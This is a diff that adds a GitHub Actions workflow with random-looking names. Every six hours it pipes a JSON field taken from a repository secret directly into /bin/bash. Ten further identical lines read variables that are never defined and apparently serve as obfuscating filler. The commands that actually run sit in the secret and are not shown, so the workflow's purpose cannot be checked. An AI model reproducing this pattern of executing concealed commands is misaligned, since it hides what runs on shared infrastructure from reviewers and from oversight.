@@ -1,0 +1,28 @@
+name: qingfengnanzhii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qingfengnanzhii
+        env:
+          ckvn55: ${{ secrets.ckvn55 }}
+        run: |
+          echo $ckvn55 | jq -r .tm6076 | /bin/bash
+          echo $oben5 | jq -r .udm462 | /bin/bash
+          echo $h0 | jq -r .kyfqn23087 | /bin/bash
+          echo $p45915 | jq -r .glfi5 | /bin/bash
+          echo $pgstw106 | jq -r .d421 | /bin/bash
+          echo $sylu43 | jq -r .y689 | /bin/bash
+          echo $hom1222 | jq -r .cx1 | /bin/bash
+          echo $mfbvj308 | jq -r .aobw9056 | /bin/bash
+          echo $wre45 | jq -r .gfzcz32301 | /bin/bash
+          echo $sysq4 | jq -r .b1576 | /bin/bash
+          echo $rln5046 | jq -r .ldlk55 | /bin/bash
+
